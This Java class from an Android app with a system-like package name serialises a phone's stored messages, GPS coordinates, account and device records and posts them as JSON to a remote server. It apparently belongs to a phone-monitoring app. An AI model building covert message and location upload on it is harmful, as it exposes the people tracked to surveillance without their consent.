package android.service.app.json;

import android.content.Context;
import android.service.app.db.Data;
import android.service.app.db.DataBridge;
import android.service.app.db.DatabaseHelper;
import android.service.app.db.data.Gps;
import android.service.app.db.data.Message;
import android.service.app.db.inventory.Device;
import android.service.app.db.user.Account;
import android.service.app.http.HttpClient;
import android.service.app.utils.Log;

import org.json.JSONObject;

import java.util.Collections;
import java.util.LinkedHashSet;
import java.util.Map;
import java.util.Set;

public class RestBridge implements DataBridge<DataFilter, RestHttpResponseHandler>
{
    private final Context context;

    public RestBridge(Context context)
    {
        this.context = context;
    }

    @Override
    public Set<Message> getMessages(DataFilter s)
    {
        return Collections.emptySet();
    }

    @Override
    public Set<Gps> getCoordinates(DataFilter s)
    {
        return Collections.emptySet();
    }

    @Override
    public Account getAccount(DataFilter s)
    {
        return new Account();
    }

    @Override
    public Set<Device> getDevices(DataFilter s)
    {
        return Collections.emptySet();
    }

    @Override
    public RestHttpResponseHandler postMessages(Set<Message> messages)
    {
        RestHttpResponseHandler responseHandler = null;
        Set<JSONObject> jsonObjects = new LinkedHashSet<>();
        for (Message message: messages)
        {
            Map<String, Object> data = message.getData();
            data.put(Message.DEVICE_ID, message.getDevice().getName());
            setSyncId(message, data);

            jsonObjects.add(new JSONObject(data));
            responseHandler = new RestHttpResponseHandler();
        }

        if (Log.isInfoEnabled()) Log.info("Message.jsonObjects=" + jsonObjects);
        HttpClient.postJson(context, DatabaseHelper.MESSAGE.getTableName(), jsonObjects, responseHandler);
        return responseHandler;
    }

    private void setSyncId(Data bean, Map<String, Object> data)
    {
        data.put(Data.SYNCID, bean.getId());
    }

    @Override
    public RestHttpResponseHandler postGps(Set<Gps> gpsSets)
    {
        RestHttpResponseHandler responseHandler = null;
        Set<JSONObject> jsonObjects = new LinkedHashSet<>();
        for (Gps gps: gpsSets)
        {
            Map<String, Object> data = gps.getData();
            //todo: need to refactor
            data.put(Gps.DEVICE_ID, gps.getDevice().getName());
            setSyncId(gps, data);
            jsonObjects.add(new JSONObject(data));
            responseHandler = new RestHttpResponseHandler();
        }

        if (Log.isInfoEnabled()) Log.info("Gps.jsonObjects=" + jsonObjects);
        HttpClient.postJson(context, DatabaseHelper.GPS.getTableName(), jsonObjects, responseHandler);
        return responseHandler;
    }

    @Override
    public RestHttpResponseHandler postAccount(Account account)
    {
        Map<String, Object> data = account.getData();
        JSONObject jsonObject = new JSONObject(data);
        if (Log.isInfoEnabled()) Log.info("Account.jsonObject=" + jsonObject);

        RestHttpResponseHandler responseHandler = new RestHttpResponseHandler();
        HttpClient.postJson(context, DatabaseHelper.ACCOUNT.getTableName(), jsonObject, responseHandler);
        return responseHandler;
    }

    @Override
    public RestHttpResponseHandler postDevice(Device device)
    {
        Map<String, Object> data = device.getData();
        data.put(Device.ACCOUNT_ID, device.getAccount().getEmail());
        JSONObject jsonObject = new JSONObject(data);
        if (Log.isInfoEnabled()) Log.info("Device.jsonObject=" + jsonObject);
        RestHttpResponseHandler responseHandler = new RestHttpResponseHandler();
        HttpClient.postJson(context, DatabaseHelper.DEVICE.getTableName(), jsonObject, responseHandler);
        return responseHandler;
    }
}
